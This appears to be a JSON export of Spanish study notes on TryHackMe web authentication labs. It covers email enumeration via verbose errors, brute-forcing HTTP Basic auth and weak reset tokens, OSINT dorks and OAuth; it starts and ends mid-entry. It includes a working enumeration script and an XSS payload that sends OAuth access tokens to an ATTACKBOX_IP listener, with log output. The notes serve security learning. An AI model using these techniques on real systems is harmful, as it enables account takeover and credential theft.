'XMLHttpRequest',\n        'Origin': 'http://enum.thm',\n        'Connection': 'close',\n        'Referer': 'http://enum.thm/labs/verbose_login/',\n    }\n    data = {\n        'username': email,\n        'password': 'password',  # Use a random password as we are only checking the email\n        'function': 'login'\n    }\n\n    response = requests.post(url, headers=headers, data=data)\n    return response.json()\n\ndef enumerate_emails(email_file):\n    valid_emails = []\n    invalid_error = \"Email does not exist\"  # Error message for invalid emails\n\n    with open(email_file, 'r') as file:\n        emails = file.readlines()\n\n    for email in emails:\n        email = email.strip()  # Remove any leading/trailing whitespace\n        if email:\n            response_json = check_email(email)\n            if response_json['status'] == 'error' and invalid_error in response_json['message']:\n                print(f\"[INVALID] {email}\")\n            else:\n                print(f\"[VALID] {email}\")\n                valid_emails.append(email)\n\n    return valid_emails\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python3 script.py <email_list_file>\")\n        sys.exit(1)\n\n    email_file = sys.argv[1]\n\n    valid_emails = enumerate_emails(email_file)\n\n    print(\"\\nValid emails found:\")\n    for valid_email in valid_emails:\n        print(valid_email)\n```\n\n<h4>Desglose</h4>\n<h6>Importaciones</h6>\n- **requests:** Una librer√≠a de Python para hacer peticiones HTTP. Se usa para interactuar con el servidor web mandando peticiones POST al endpoint objetivo.\n\n```python\nimport requests\n```\n\n<h6>Setup</h6>\n- **url:** El script apunta al endpoint objetivo que maneja la funcionalidad de login de la aplicaci√≥n.\n\n```python\nurl = 'http://enum.thm/labs/verbose_login/functions.php'\n```\n\n- **headers:** Una colecci√≥n de headers HTTP se define para imitar una petici√≥n t√≠pica de navegador, asegurando que las peticiones parezcan leg√≠timas.\n\n```python\nheaders = {\n      'Host': 'enum.thm',\n      'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',\n      'Accept': 'application/json, text/javascript, */*; q=0.01',\n      'Accept-Language': 'en-US,en;q=0.5',\n      'Accept-Encoding': 'gzip, deflate',\n      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',\n      'X-Requested-With': 'XMLHttpRequest',\n      'Origin': 'http://enum.thm',\n      'Connection': 'close',\n      'Referer': 'http://enum.thm/labs/verbose_login/',\n  }\n```\n\n<h6>Inicializaci√≥n de variables</h6>\n- **valid_emails:** Un array guarda las direcciones de email v√°lidas.\n\n```python\nvalid_emails = []\n```\n\n- **invalid_error:** Una string contiene el mensaje de error espec√≠fico usado para identificar correos inv√°lidos.\n\n```python\ninvalid_error = 'Email does not exist'\n```\n\n<h6>Loop Principal</h6>\n- El script comprueba los emails dados y mira si son v√°lidos usando la funci√≥n `check_email`.\n\n```python\nfor email in email_list:\n    check_email(email)\n```\n\n<h6>Confecci√≥n y Mandado de Peticiones</h6>\n- Para cada email, el script construye un diccionario de informaci√≥n que incluye la direcci√≥n de email, un placeholder \"password\" y un comando que ejecuta la funci√≥n login.\n\n```python\ndata = {'username': email, 'password': 'password', 'action': 'login'}\nresponse = requests.post(url, headers=headers, data=data)\n```\n\n<h6>Manejo de Respuestas</h6>\n- La respuesta del servidor se procesa para comprobar su el email dado existe, bas√°ndose en la existendia de un error espec√≠fico en la informaci√≥n JSON.\n\n```python\nif invalid_error in response.text:\n    print(f\"{email} is invalid.\")\nelse:\n    print(f\"{email} is valid.\")\n    valid_emails.append(email)\n```\n\n<h6>Verificaci√≥n de Caracteres</h6>\n- Los emails confirmados se unen a la lista `valid_emails`.\n\n```python\nfor email in valid_emails:\n    print(f\"Valid email found: {email}\")\n```\n\nPodemos usar una lista de emails comunes de este [repositorio](https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt).\n\n![[Pasted image 20251202143925.png]]\n\nUna vez hayas descargado la lista, usa el script para comprobar emails v√°lidos.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Exploiting HTTP Basic Authentication",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/5-exploiting-http-basic-authentication/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/5. Exploiting HTTP Basic Authentication.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
    "content": "<h2>Basic Authentication in 2k24?</h2>\nLa autentificaci√≥n b√°sica ofrece un m√©todo m√°s directo de securizar el acceso a los dispositivos. S√≥lo requiere un usuario y una contrase√±a, haci√©ndolo sencillo de implementar y manejar en dispositivos con capacidades de procesamiento b√°sicas. Los dispositivos de redo como los routers suelen usar este m√©todo. En este escenario el objetivo principal es protegerlo de acceso no autorizado.\n\nMientras que la autentificaci√≥n b√°sica no ofrece las robustas funcionalidades de seguridad ofrecida por esquemas m√°s complejos como OAuth o autentificaci√≥n basada en tokens, su simplicidad lo hace adecuado para entornos donde el manejo de sesi√≥n y el rastreo de usuarios no se requiera.\n\nLa autentificaci√≥n b√°sica HTTP se define en [RFC 7617](https://datatracker.ietf.org/doc/html/rfc7617), el cual especifica que las credenciales deber√≠an ser transportadas como una string bas64-encodeada en el header de autorizaci√≥n HTTP. Es directo pero no es seguro en conexiones no-HTTPS ya que bas64 no es un mecanismo de encriptaci√≥n. El riesgo real viene dado por credenciales d√©biles.\n\nLa [autentificaci√≥n b√°sica HTTP](_https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication_) ofrece un mecanismo simple de pregunta respuesta para pedir credenciales de usuario.\n\n![[Pasted image 20251202172103.png]]\n\nEl formato del header de autorizaci√≥n es el siguiente:\n\n```html\nAuthorization: Basic <credentials>\n```\n\nDonde `<credentials>` es el encoding base64 de `username:password`.\n\n-------------------------------------\n<h2>Explotaci√≥n</h2>\nPara demostrar esto, iremos a la p√°gina dada.\n\n![[Pasted image 20251202172348.png]]\n\nIntroducimos cualquier usuario y contrase√±a en el pop--up.\n\n![[Pasted image 20251202172436.png]]\n\nCapturamos la petici√≥n b√°sica de autentificaci√≥n usando Burp Suite\n\n![[Pasted image 20251202172701.png]]\n\nConvertimos el texto base64:\n\n![[Pasted image 20251202172950.png]]\n\nUna vez decodeado lo highlighteamos con el intruder.\n\n![[Pasted image 20251202173135.png]]\n\nUsaremos la lista `/usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt`.\n\n![[Pasted image 20251202173242.png]]\n\nAhora necesitamos configurar dos normas:\n\n1. La primera que configuraremos a√±ade el prefijo `admin:` para que el payload sea `username:password`.\n   ![[Pasted image 20251202173353.png]]\n2. La segunda convierte el payload a base64.\n   ![[Pasted image 20251202173411.png]]\n\nTambi√©n deber√≠amos borrar el `=` porque base64 lo utiliza para hacer que tengan la misma longitud. Para hacerlo vamos hasta abajo y lo borramos de la lista de caracteres a quitar en el payload.\n\n![[Pasted image 20251202173526.png]]\n\nUna vez hecho vamos arrancamos el ataque.\n\n![[Pasted image 20251202174019.png]]\n\nEncontramos la contrase√±a.\n\n![[Pasted image 20251202174418.png]]\n\nNos registramos pa obtener la flag.\n\n![[Pasted image 20251202174510.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Enumeration & Brute Force",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/0-enumeration-brute-force/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/0. Enumeration & Brute Force.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/1. Introduction]]\n[[2. Authentication Enumeration]]\n[[3. Enumerating Users via Verbose Errors]]\n[[4. Exploiting Vulnerable Password Reset Logic]]\n[[5. Exploiting HTTP Basic Authentication]]\n[[6. OSINT]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. OSINT",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/6-osint/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/6. OSINT.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
    "content": "<h2>Wayback URLs y Google Dorks</h2>\nProfundizando en el pasado de la aplicaci√≥n puede ser tan revelador como examinar el presente:\n\n----------------------------\n<h2>Wayback URLs</h2>\nPiensa en el archivo de Internet [Wayback Machine](https://archive.org/web/) como una m√°quina del tiempo. Te permite viajar al pasado y explorar versiones antiguas de websites, descubriendo arcgivos y directorios que ya no son visibles. Estas reliquias pueden ofrecer backdoors en el presente.\n\n![[Pasted image 20251202181810.png]]\n\nUsando por ejemplo TryHackMe como objetivo, podemos ver las versiones pasadas.\n\n![[Pasted image 20251202181857.png]]\n\nPara dumpear todos los links guardados en la Wayback Machine podemos usar una herramienta llamada [waybackurls](https://github.com/tomnomnom/waybackurls).\n\nPara instalarlo usamos los siguientes comandos.\n\n```bash\nuser@tryhackme $ git clone https://github.com/tomnomnom/waybackurls\nuser@tryhackme $ cd waybackurls\nuser@tryhackme $ sudo apt install golang-go -y # This command is optional\nuser@tryhackme $ go build\nuser@tryhackme $ ls -lah\ntotal 6.6M\ndrwxr-xr-x 4 user user 4.0K Jul  1 18:20 .\ndrwxr-xr-x 9 user user 4.0K Jul  1 18:20 ..\ndrwxr-xr-x 8 user user 4.0K Jul  1 18:20 .git\n-rw-r--r-- 1 user user   36 Jul  1 18:20 .gitignore\n-rw-r--r-- 1 user user  454 Jul  1 18:20 README.mkd\n-rw-r--r-- 1 user user   49 Jul  1 18:20 go.mod\n-rw-r--r-- 1 user user 5.4K Jul  1 18:20 main.go\ndrwxr-xr-x 2 user user 4.0K Jul  1 18:20 script\n-rwxr-xr-x 1 user user 6.5M Jul  1 18:20 waybackurls\nuser@tryhackme $ ./waybackurls tryhackme.com\n[-- snip --]\nhttps://tryhackme.com/.well-known/ai-plugin.json\nhttps://tryhackme.com/.well-known/assetlinks.json\nhttps://tryhackme.com/.well-known/dnt-policy.txt\nhttps://tryhackme.com/.well-known/gpc.json\nhttps://tryhackme.com/.well-known/nodeinfo\nhttps://tryhackme.com/.well-known/openid-configuration\nhttps://tryhackme.com/.well-known/security.txt\nhttps://tryhackme.com/.well-known/trust.txt\n[-- snip --]\n```\n\n----------------------------------\n<h2>Google Dorks</h2>\nAqu√≠ es donde brilla tu conocimiento sobre los motores de b√∫squeda. Configurando queries espec√≠ficas conocidas como Google Dorks puedes encontrar informaci√≥n que no estaba hecha para ser p√∫blica. Por ejemplo:\n\n- Para encontrar paneles administrativos: `site:example.com inurl:admin`\n- Para descubrir logs con contrase√±a: `filetype:log \"password\" site:example.com`\n- Para descubrir directorios de backup: `intitle:\"index of\" \"backup\" site:example.com`",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Exploiting Vulnerable Password Reset Logic",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/1-enumeration-brute-force/4-exploiting-vulnerable-password-reset-logic/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/1. Enumeration & Brute Force/4. Exploiting Vulnerable Password Reset Logic.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 1. Enumeration & Brute Force",
    "content": "<h2>Vulnerabilidades del Flujo de Reseteo de Contrase√±as</h2>\nLos mecanismos de reseteo de contrase√±as son una parte muy importante para la conveniencia de los usuarios en las aplicacaiones web modernas. Sin embargo, su implementaci√≥n requiere un manejo cuidadosoo de las consideraciones de seguridad.\n\n<h4>Email-Based Reset</h4>\nCuando un usuario resetea su contrase√±a, la aplicaci√≥n le manda un email conteniendo un link de reseteo o token a la cuenta de email registrada del usuario.\n<h4>Security Question-Based Reset</h4>\nInvolucra al usuario respondiendo una serie de preguntas de seguridad preconfiguradas al crear la cuenta. Si las respuestas son correctas, el sistema deja que el usuario cambie la contrase√±a.\n<h4>SMS-Based Reset</h4>\nEsta es similar a la basada en email pero con el uso del SMS para dar un c√≥digo o link de reseteo.\n<h4>Vulnerabilidades</h4>\nCada uno de estos m√©todos tiene sus vulnerabilidades:\n\n- **Predictible Tokens:** Si los tokens de reseteo usados en los links o SMSs son predecibles o siguen un patr√≥n secuencial, los atacantes pueden adivinar o bruteforcear las URLs.\n- **Token Expiration Issues:** Los tokens que no terminan pronto o inmediatamente despu√©s de su uso, son potenciales vectores de ataque.\n- **Insufficient Validation:** Los mecanismos para verificar la identidad del usuario pueden ser d√©biles o susceptible de explotaci√≥n si las preguntas son muy comunes.\n- **Information Disclosure:** Cualquier mensaje de error que especifique si el email o nombre de usuario est√° registrado, puede ayudar a los atacantes a enumerar.\n- **Insecure Transport:** La transmisi√≥n del link o token de reseteo mediante conexiones no-HTTPS, pueden exponerlos.\n\n----------------------------------\n<h2>Explotar Tokens Predecibles</h2>\nLos tokens simples, predecibles o tienen un tiempo de expiraci√≥n largo, pueden ser vulnerables a la intercepci√≥n o fuerza bruta. Por ejemplo, el c√≥digo de abajo se usa por la aplicaci√≥n vulnerable en el lab de Tokens Predictibles.\n\n```php\n$token = mt_rand(100, 200);\n$query = $conn->prepare(\"UPDATE users SET reset_token = ? WHERE email = ?\");\n$query->bind_param(\"ss\", $token, $email);\n$query->execute();\n```\n\nEste c√≥digo configura un PIN de 3 d√≠gitos como token de reseteo. Como no emplea caracteres mixtos, puede ser f√°cilmente bruteforceado.\n\nPara probar esto vamos a la aplicaci√≥n.\n\n![[Pasted image 20251202162449.png]]\n\nNavegamos hasta la p√°gina de reseteo de contrase√±a y metemos el email `admin@admin.com`.\n\n![[Pasted image 20251202162608.png]]\n\nLa aplicaci√≥n responder√° con un mensaje de √©xito.\n\n![[Pasted image 20251202162635.png]]\n\nAhora usaremos burpsuite para generar peticiones web de fuerza bruta. Porque si probamos uno aleatorio se ve as√≠:\n\n![[Pasted image 20251202163208.png]]\n\nArrancamos el ataque:\n\n![[Pasted image 20251202163423.png]]\n\nEsperamos.\n\n![[Pasted image 20251202164031.png]]\n\nUna vez encontrado iniciamos sesi√≥n y obtenemos la flag:\n\n![[Pasted image 20251202164138.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. OAuth Grant Types",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/2-oauth-grant-types/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/2. OAuth Grant Types.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "OAuth 2.0 ofrece varios tipos de permisos para acomodarse a varios escenarios y tipos de clientes. Estos tipos definen c√≥mo la aplicaci√≥n puede obtener un token de acceso para acceder a recursos protegidos en nombre del due√±o del recurso. En esta tarea, veremos 4 tipos de permiso OAuth 2.0.\n\n------------------------------------\n<h2>Authorization Code Grant</h2>\nEste es el flujo OAuth m√°s usado que se ajusta a las aplicaciones del lado del servidor (PHP, JAVA; .NET, etc). En este flujo **el cliente redirige al usuario al servidor de autorizaci√≥n, donde el usuario se autentifica y concede la autorizaci√≥n**. El servidor entonces redirige al usuario al cliente con el c√≥digo de autorizaci√≥n. El cliente intercambia dicho c√≥digo por un token de acceso pidi√©ndoselo al endpoint del token del servidor de autorizaci√≥n.\n\n![[Pasted image 20251221174848.png]]\n\nEs conocido por ensalzar la seguridad, ya que el c√≥digo de autorizaci√≥n es intercambiado por un token de acceso server-to-server, por lo que el token no es expuesto mediante el user agent (navegador), reduciendo el riesgo de filtraci√≥n de token. Tambi√©n soporta usar tokens de refresco.\n\n----------------------------------\n<h2>Implicit Grant</h2>\nEst√° principalmente dise√±ado para aplicaciones web y m√≥viles donde los clientes no pueden guardar secretos de forma segura. **Emite directamente el token de acceso al cliente sin requerir la autorizaci√≥n de un c√≥digo externo**. En este flujo, el cliente redirige al usuario al servidor de autorizaci√≥n. Despu√©s de que el usuario se autentifique y le de autorizaci√≥n, el servidor de autorizaci√≥n devuelve un token de acceso en el fragmento URL. El flujo es as√≠:\n\n![[Pasted image 20251221232716.png]]\n\nEste tipo de permiso est√° simplificado y es adecuado para clientes que no pueden guardar secretos de forma segura. Es m√°s r√°pido ya que incluye menos pasos que el authorization code grant. Sin embargo, es menos seguro ya que el token de acceso est√° expuesto en el user agent y puede ser registrado por el historial del navegador. Adem√°s no soporta tokens de refresco.\n\n------------------------------------------\n<h2>Resource Owner Password Credentials Grant</h2>\nSe usa cuando el cliente es **altamente confiado por el due√±o del recurso**, como las aplicaciones first-party. El cliente colecciona las credenciales del usuario directamente y las intercambia por un token de acceso como se muestra debajo.\n\n![[Pasted image 20251221234303.png]]\n\nEn este flujo, el usuario ofrece sus credenciales directamente al cliente. El cliente manda las credenciales al servidor de autorizaci√≥n el cual verifica las credenciales y emite un token de acceso. Este tipo de permiso es directo, requiriendo menos interacciones, haci√©ndolo adecuado para aplicaciones altamente confiables donde el usuario est√° seguro de dar sus credenciales. Sin embargo, es menos seguro porque incluye compartir las credenciales directamente con el cliente y no es sostenible para aplicaciones de terceros.\n\n--------------------------------------\n<h2>Client Credentials Grant</h2>\nSe usa para las interacciones server-to-server sin intromisi√≥n del usuario. El cliente usa sus credenciales para autentificarse con el servidor de autorizaci√≥n y obtener un token de acceso. En este flujo el cliente se autentifica con el servidor de autorizaci√≥n usando sus credenciales, y el servidor de autorizaci√≥n emite un token de acceso directamente al cliente como se ve aqu√≠ abajo:\n\n![[Pasted image 20251221234739.png]]\n\nEl adecuado para servicios backend y comunicaciones servidor a servidor ya que no incluye credenciales de usuario, por lo que reduce los riesgos de seguridad relativos a la exposici√≥n de datos del usuario.",
    "modified": "2025-12-22T00:56:16"
  },
  {
    "title": "7. Exploiting OAuth - Implicit Grant Flow",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/7-exploiting-oauth-implicit-grant-flow/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/7. Exploiting OAuth - Implicit Grant Flow.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "EN el flujo de permiso impl√≠cito, los tokens se devuelven directamente al cliente via navegador sin requerir ning√∫n c√≥digo de autorizaci√≥n . Este flujo es principalmente usado por aplicaciones de una sola p√°gina y est√° dise√±ado para clientes p√∫blicos que no pueden almacenar de forma segura secretos de clientes. Sin embargo, este flujo tiene vulnerabilidades inherentes.\n\n------------------------------------------\n<h2>Debilidades</h2>\n- **Exponer Tokens de Acceso en la URL:** La aplicaci√≥n redirige al usuario al endpoint de autorizaci√≥n OAuth, el cual devuelve el token de acceso en el fragmento URI. Cualquier script que corra en la p√°gina puede acceder a este fragmento.\n- **Validar Inadecuadamente las URIs de Redirecci√≥n:** El servidor OAuth no valida adecuadamente las URIs de redirecci√≥n, permitiendo a ataques manipular el endpoint de redirecci√≥n.\n- **HTTPS sin Implementar:** La aplicaci√≥n no aplica HTTPS, lo que puede llevara intercepci√≥n del token mediante ataques MITM.\n- **Manejo Inadecuado de Tokens de Acceso:** La aplicaci√≥n guarda el token de acceso de forma insegura, posiblemente en `localStorage` o `sessionStorage`, haci√©ndolo vulnerable a ataques XSS.\n\n-------------------------------------------\n<h2>Obsolescencia del Flujo de Permiso Impl√≠cito</h2>\nDebido a estas vulnerabilidades, el framework de [Mejor Pr√°ctica Actual respecto a OAuth 2.0](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics) recomienda dejar de utilizar el flujo de permiso impl√≠cito en favor del c√≥digo de autorizaci√≥n con [Prueba Clave del Intercambio de C√≥digo (PKCE)](https://auth0.com/docs/get-started/authentication-and-authorization-flow/authorization-code-flow-with-pkce). Este flujo mejorado permite seguridad mejorada mitigando los riesgos de la exposici√≥n del token y la falta de autentificaci√≥n del cliente.\n\n------------------------------\n<h2>Pr√°ctica</h2>\n>[!CAUTION] Antes de empezar con el ejercicio aseg√∫rate de tener la sesi√≥n cerrada visitando http://coffee.thm:8000/admin/logout.\n\nVisita `http://factbook.thm:8080`, donde ver√°s una p√°gina que permite sincronizar tus estados de `CoffeeShopApp`. El proceso de autorizaci√≥n empezar√° una vez que hagas click en el bot√≥n \"Sync Statuses from CoffeeShopApp\". La aplicaci√≥n cliente est√° configurada para usar el tipo de permiso impl√≠cito, lo que significa que el token de acceso ser√° directamente devuelto al cliente. La URL de autorizaci√≥n se construye as√≠:\n\n```javascript\nvar client_id = 'npmL7WDiRoOvjZoGSDiJhU2ViodTdygjW8rdabt7';\nvar redirect_uri = 'http://factbook.thm:8080/callback.php'; \nvar auth_url = \"http://coffee.thm:8000/o/authorize/\";\nvar url = auth_url + \"?response_type=token&client_id=\" + client_id + \"&redirect_uri=\" + encodeURIComponent(redirect_uri);\nwindow.location.href = url;\n```\n\n-------------------------------------\n<h2>Perspectiva de la V√≠ctima</h2>\nUna vez que el usuario se identifica usando el proveedor de OAuth con las credenciales `victim:victim123`, ser√° redirigido a `callback.php`, donde puede introducir un estado. Esta p√°gina incluye un formulario para introducir estados y subirlos v√≠a una petici√≥n AJAX.\n\n```html\n<button class=\"btn btn-primary\" onclick=\"submitStatus()\">Submit</button>\n<h2 class=\"mt-4\">Submitted Status</h2>\n<ul class=\"list-group\" id=\"status-list\">\n    <?php\n    session_start();\n    if (isset($_POST['status'])) {\n        $status = $_POST['status'];\n        if (!isset($_SESSION['statuses'])) {\n            $_SESSION['statuses'] = [];\n        }\n        $_SESSION['statuses'][] = $status;\n        header('Content-Type: application/json');\n        echo json_encode(['status' => $status]);\n        exit();\n    }\n    // Display previously stored statuses\n    if (isset($_SESSION['statuses'])) {\n        foreach ($_SESSION['statuses'] as $status) {\n            echo '<li class=\"list-group-item\">' . $status . '</li>';\n        }\n    }\n    ?>\n</ul>\n```\n\nCon prop√≥sitos de demostraci√≥n, el campo de input de estado es vulnerable a XSS. Una vez alcances la p√°gina de estado e introduzcas un estado como \"Hello\", ser√° publicado. Sin embargo, si un atacante explota esta vulnerabilidad, puede inyectar un script malicioso.\n\n![[Pasted image 20251223171441.png]]\n\n-------------------------------------------\n<h2>Perspectiva del Atacante</h2>\nPara prepararte para el ataque, corre un servidor Python usando `python3 -m http.server 8081`. Si te salta un error de puerto en uso, usa otro. El atacante compartir√° el siguiente payload con la v√≠ctima el cual introdujo como estado:\n\n```javascript\n<script>var hash = window.location.hash.substr(1);var result = hash.split('&').reduce(function (res, item) {var parts = item.split('=');res[parts[0]] = parts[1];\n    return res;\n  }, {});\n  var accessToken = result.access_token;\n    var img = new Image();\n    img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;\n</script>\n```\n\nVeamos el payload:\n\n- Comienza extrayendo el fragmento identificador de la URL, que es la parte de la URL que sigue al s√≠mbolo `#`. Elimina `#` usando `substr(1)`.\n- Esta string se parte por `&` para separar los pares de clave-valor. La funci√≥n `reduce` procesa cada uno de estos pares, parti√©ndolos por `=` para aislar las claves y los valores. Y se guardan dichos pares.\n- El script extrae el valor `access_token` y lo asigna a la variable `accessToken`. Para exfiltrar este token de acceso, el script crea un nuevo Objeto de Imagen y configura su atributo `src` para que apunte al servidor del atacante (`http://ATTACKBOX_IP:8081/steal_token`), a√±adiendo el token de acceso como par√°metro.\n- Cuando se carga la imagen, dispara una petici√≥n al servidor del atacante con el token robado incluido en la URL.\n\nCopia y pega el c√≥digo dentro de la m√°quina de la v√≠ctima en el campo de status. Refresca la p√°gina si no te llega.\n\n```bash\nroot@ip-10-10-162-175:~# python3 -m http.server 8081\nServing HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...\n10.9.2.217 - - [27/Aug/2024 19:30:10] code 404, message File not found\n10.9.2.217 - - [27/Aug/2024 19:30:10] \"GET /steal_token?token=2aauviER3lUOev8wNmXQ9B4GNUoadE HTTP/1.1\" 404 -\n```",
    "modified": "2025-12-24T00:53:35"
  },
  {
    "title": "1. Key Concepts",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/1-authentication/4-oauth-vulnerabilities/1-key-concepts/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/1. Authentication/4. OAuth Vulnerabilities/1. Key Concepts.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 1. Authentication > 4. OAuth Vulnerabilities",
    "content": "EN esta tarea veremos los conceptos clave para entender OAuth, espec√≠ficamente OAuth 2.0. Para hacer los conceptos m√°s f√°ciles de entender, los explicaremos mediante un ejemplo: usar la app de m√≥vil de una cafeter√≠a para pedir y pagar un caf√©.\n\n---------------------------------------------\n<h2>Resource Owner</h2>\nEl due√±o del recurso es la persona o sistema que controla cierta informaci√≥n y puede autorizar a la aplicaci√≥n a acceder a dicha informaci√≥n en su nombre. Este concepto es fundamental, ya que se centra en el contenido del usuario y su control. Por ejemplo, eres el due√±o del recurso siendo un cliente de la cafeter√≠a, ya que puedes controlar la informaci√≥n de tu cuenta y darle permiso a la app para acceder a tus datos.\n\n----------------------------------------\n<h2>Client</h2>\nEl cliente puede ser una app m√≥vil o una aplicaci√≥n web del lado del servidor. Act√∫a como intermediario, pidiendo acceso a recursos y realizando las acciones que el due√±o del recurso le permite. Por ejemplo, la aplicaci√≥n web o m√≥vil  de la cafeter√≠a es el cliente. El cual necesita tu autorizaci√≥n para acceder a los detalles de tu cuenta, incluyendo la informaci√≥n de pago.\n\n-----------------------------------\n<h2>Servidor de Autorizaci√≥n</h2>\nEl servidor de autorizaci√≥n es responsable de emitir tokens de acceso al cliente despu√©s de haber autentificado exitosamente al due√±o del recurso y haber obtenido su autorizaci√≥n. El servidor de autorizaci√≥n juega un papel crucial en el proceso OAuth asegur√°ndose de que el cliente recibe el permiso s√≥lo despu√©s de que se realice un consentimiento y autorizaci√≥n de usuario leg√≠timos. Por ejemplo, el sistema de backend  de la cafeter√≠a que maneja la autentificaci√≥n y autorizaci√≥n es el servidor de autorizaci√≥n. Verifica tus credenciales y le da permiso (si son correctas) a la app para que acceda a tu cuenta.\n\n----------------------------------------------\n<h2>Servidor de Recursos</h2>\nEl servidor que hostea los recursos protegidos puede aceptar y responder a las peticiones hacia estos recursos usando tokens. Este servidor se asegura de que s√≥lo clientes autentificados y autorizados puedan acceder o manipular la informaci√≥n del due√±o del recurso. Por ejemplo, ser√≠a la base de datos de la cafeter√≠a que guarda tu informaci√≥n de cuenta, historial de compra y detalles de pago. Responde a peticiones de la aplicaci√≥n permiti√©ndole recuperar y modificar tu informaci√≥n.\n\n--------------------------------------\n<h2>Authorization Grant</h2>\nEl cliente usa una credencial representando la autorizaci√≥n del due√±o del recurso para obtener un token de acceso. Los tipos primarios de permiso son: `Authorization Code`, `Implicit`, `Resource Owner Password Credentials` y `Client Credentials`. Por ejemplo, cuando inicias sesi√≥n en la app de la cafeter√≠a, se te da un permiso de autorizaci√≥n. La aplicaci√≥n usa este permiso para darte un token de acceso desde el servidor de autorizaci√≥n.\n\n--------------------------------\n<h2>Refresh Token</h2>\nUna credencial que el cliente puede usar para obtener un nuevo token de acceso sin requerir que el due√±o del recurso se re-autentifique. Los tokens de refresco, suelen tener un gran tiempo de vida y ofrecen una forma de mantener las sesiones del usuario sin interrupciones frecuentes de login. Por ejemplo, cuando tu token de acceso vence, la aplicaci√≥n web usa el token de refresco para obtener un nuevo token de acceso para que no tengas que volver a loguearte.\n\n------------------------------------------\n<h2>Redirect URI</h2>\nLa URI a la que el servidor de autorizaci√≥n redirigir√° al user-agent del due√±o del recurso despu√©s de la aceptaci√≥n o denegaci√≥n de la autorizaci√≥n. Comprueba si el cliente para el que se ha pedido la respuesta es correcto. Por ejemplo, despu√©s de interactuar con la app de la cafeter√≠a e iniciar sesi√≥n, ser√°s redirigido al servidor de autorizaci√≥n por la p√°gina de la app, conocida como URI de redirecci√≥n para confirmar que has iniciado sesi√≥n exitosamente.\n\n---------------------------------------\n<h2>Scope</h2>\nScopes son un mecanismo para limitar los accesos de una aplicaci√≥n a la cuenta de un usuario. Permiten al cliente especificar el nivel de acceso necesitado y al servidor de autorizaci√≥n informar al usuario sobre los niveles de acceso que la aplicaci√≥n pide. El alcance (scope) ayuda a reforzar el concepto de los menos privilegios posibles. Por ejemplo, la app de la cafeter√≠a puede pedir diferentes scopes, como acceso a tu historial de compra e informaci√≥n de pago. Como due√±o del recurso, puedes ver qu√© informaci√≥n pide la app y dar o denegar dichos permisos.\n\n-----------------------------------------------\n<h2>State Parameter</h2>\nUn par√°metro opcional mantiene el estado entre el cliente u el servidor de autorizaci√≥n. Puede ayudar a prevenir ataques CSRF asegurando que la respuesta coincide con la petici√≥n del cliente. El parameter state es una parte crucial de securizar el flujo OAuth. Por ejemplo, cuando inicias el proceso de login, la app de la cafeter√≠a manda  un parameter state al servidor de autorizaci√≥n. Este par√°metro ayuda a asegurar que la respuesta que recibes est√° vinculada a tu petici√≥n original, protegiendo contra cierto tipo de ataques.\n\n------------------------------------------\n<h2>Token & Authorization Endpoint</h2>\nEl endpoint del servidor de autorizaci√≥n es donde el cliente intercambia el permiso de autorizaci√≥n (o refresh token) por un token de 